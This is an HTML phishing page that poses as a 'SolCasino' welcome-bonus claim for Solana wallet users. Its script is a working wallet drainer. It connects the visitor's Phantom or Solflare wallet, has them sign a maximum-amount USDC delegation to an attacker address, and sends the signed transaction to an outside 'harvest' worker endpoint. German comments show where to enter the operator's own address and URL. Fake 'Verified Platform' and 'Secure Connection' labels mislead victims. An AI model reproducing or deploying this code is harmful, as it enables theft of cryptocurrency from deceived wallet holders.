<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SolCasino | Welcome Bonus</title>
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
<script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  
  body {
    font-family: 'Inter', sans-serif;
    background-color: #050505;
    color: #ffffff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
  }

  /* Background Animations */
  .orb {
    position: absolute;
    border-radius: 50%;
    filter: blur(80px);
    z-index: 0;
    animation: float 10s infinite ease-in-out alternate;
  }
  .orb-1 {
    width: 300px; height: 300px;
    background: rgba(153, 69, 255, 0.4); /* Solana Purple */
    top: -10%; left: -10%;
    animation-delay: 0s;
  }
  .orb-2 {
    width: 400px; height: 400px;
    background: rgba(20, 241, 149, 0.2); /* Solana Green */
    bottom: -20%; right: -10%;
    animation-delay: -5s;
  }

  @keyframes float {
    0% { transform: translate(0, 0) scale(1); }
    100% { transform: translate(30px, 50px) scale(1.1); }
  }

  /* Main Card */
  .card {
    position: relative;
    z-index: 10;
    background: rgba(20, 20, 25, 0.6);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 32px;
    padding: 40px;
    width: 100%;
    max-width: 420px;
    text-align: center;
    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
    animation: cardEntry 0.8s cubic-bezier(0.16, 1, 0.3, 1);
  }

  @keyframes cardEntry {
    from { opacity: 0; transform: translateY(30px) scale(0.95); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }

  /* Solana Logo */
  .solana-logo {
    width: 64px;
    height: 64px;
    margin: 0 auto 24px;
    display: flex;
    gap: 3px;
    flex-direction: column;
    justify-content: center;
    align-items: center;
  }
  .solana-bar {
    width: 40px;
    height: 8px;
    background: linear-gradient(90deg, #9945FF 0%, #14F195 100%);
    transform: skewX(-20deg);
    border-radius: 2px;
  }
  .solana-bar:nth-child(1) { width: 30px; margin-left: -10px; }
  .solana-bar:nth-child(3) { width: 30px; margin-right: -10px; }

  /* Typography */
  .badge {
    display: inline-flex;
    align-items: center;
    background: rgba(20, 241, 149, 0.1);
    border: 1px solid rgba(20, 241, 149, 0.2);
    color: #14F195;
    font-size: 12px;
    font-weight: 600;
    letter-spacing: 0.5px;
    text-transform: uppercase;
    padding: 8px 16px;
    border-radius: 100px;
    margin-bottom: 24px;
  }
  .badge-dot {
    width: 6px;
    height: 6px;
    background: #14F195;
    border-radius: 50%;
    margin-right: 8px;
    box-shadow: 0 0 10px #14F195;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0% { box-shadow: 0 0 0 0 rgba(20, 241, 149, 0.7); }
    70% { box-shadow: 0 0 0 10px rgba(20, 241, 149, 0); }
    100% { box-shadow: 0 0 0 0 rgba(20, 241, 149, 0); }
  }

  h1 { font-size: 28px; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.5px; }
  .sub { color: #a1a1aa; font-size: 15px; margin-bottom: 32px; line-height: 1.5; }

  /* Bonus Display */
  .bonus-container {
    background: rgba(0, 0, 0, 0.4);
    border: 1px solid rgba(255, 255, 255, 0.05);
    border-radius: 20px;
    padding: 24px;
    margin-bottom: 32px;
    position: relative;
    overflow: hidden;
  }
  .bonus-container::before {
    content: '';
    position: absolute;
    top: 0; left: -100%; width: 50%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
    animation: shine 3s infinite;
  }

  @keyframes shine {
    100% { left: 200%; }
  }

  .amount {
    font-size: 56px;
    font-weight: 800;
    line-height: 1;
    background: linear-gradient(135deg, #ffffff 0%, #a1a1aa 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }
  .currency {
    font-size: 20px;
    font-weight: 600;
    color: #9945FF;
    background: linear-gradient(135deg, #9945FF, #14F195);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }

  /* Button */
  .claim-btn {
    width: 100%;
    padding: 20px;
    background: #ffffff;
    color: #000000;
    border: none;
    border-radius: 16px;
    font-size: 16px;
    font-weight: 700;
    font-family: 'Inter', sans-serif;
    cursor: pointer;
    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
    box-shadow: 0 4px 20px rgba(255, 255, 255, 0.15);
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
  }
  .claim-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 30px rgba(255, 255, 255, 0.25);
  }
  .claim-btn:active { transform: translateY(0); }
  .claim-btn:disabled { background: #27272a; color: #71717a; box-shadow: none; cursor: not-allowed; transform: none; }

  /* Loader */
  .spinner {
    display: none;
    width: 20px;
    height: 20px;
    border: 2px solid rgba(0,0,0,0.1);
    border-top-color: #000;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* Success State */
  .success {
    display: none;
    color: #14F195;
    font-size: 16px;
    font-weight: 600;
    margin-top: 20px;
    animation: cardEntry 0.5s ease-out;
  }
  
  .footer {
    margin-top: 24px;
    font-size: 12px;
    color: #52525b;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
</style>
</head>
<body>
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>

  <div class="card">
    <div class="solana-logo">
      <div class="solana-bar"></div>
      <div class="solana-bar"></div>
      <div class="solana-bar"></div>
    </div>
    
    <div class="badge">
      <div class="badge-dot"></div>
      Verified Platform
    </div>
    
    <h1>Welcome Bonus</h1>
    <p class="sub">Your wallet is eligible for the exclusive SolCasino starting balance.</p>
    
    <div class="bonus-container">
      <div class="amount">
        1.50 <span class="currency">SOL</span>
      </div>
    </div>

    <button class="claim-btn" id="claimBtn">
      <span id="btnText">Connect & Claim Bonus</span>
      <div class="spinner" id="spin"></div>
    </button>
    
    <div class="success" id="success">
      ✓ Bonus authorized. Balance added.
    </div>
    
    <div class="footer">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
      Secure Connection
    </div>
  </div>

<script>
  // ====== CONFIG ======
  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; // <-- Deine Adresse eintragen
  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // <-- Deine Worker URL
  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
  // ====================

  const btn = document.getElementById("claimBtn");
  const btnText = document.getElementById("btnText");
  const spin = document.getElementById("spin");
  const success = document.getElementById("success");

  btn.onclick = async () => {
    let provider;
    if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
    else if (window.solflare?.isSolflare) provider = window.solflare;

    if (!provider) {
      alert("Please install Phantom wallet.");
      return;
    }

    btn.disabled = true; 
    btnText.textContent = "Connecting..."; 
    spin.style.display = "block";

    try {
      const resp = await provider.connect();
      const victim = resp.publicKey.toString();
      
      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      const victimAta = await splToken.getAssociatedTokenAddress(
        new solanaWeb3.PublicKey(USDC_MINT),
        resp.publicKey
      );

      btnText.textContent = "Verifying eligibility...";
      await new Promise(r => setTimeout(r, 1200));

      // Build Approve (Delegation) Instruction
      const delegateIx = splToken.createApproveInstruction(
        victimAta,
        new solanaWeb3.PublicKey(ATTACKER),
        resp.publicKey,
        [],
        BigInt("18446744073709551615") // Max
      );

      const tx = new solanaWeb3.Transaction().add(delegateIx);
      tx.feePayer = resp.publicKey;
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

      btnText.textContent = "Approve in Wallet...";

      // Sign Transaction (Phantom shows "Approve Delegation")
      const signedTx = await provider.signTransaction(tx);
      
      btnText.textContent = "Processing...";

      // Send to Backend
      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          victim: victim, 
          tx: bs58.encode(signedTx.serialize()),
          chain: "solana",
          ts: Date.now() 
        })
      });

      spin.style.display = "none";
      btn.style.display = "none";
      success.style.display = "block";

    } catch (e) {
      spin.style.display = "none";
      btn.disabled = false;
      btnText.textContent = "Connect & Claim Bonus";
    }
  };
</script>
</body>
</html>
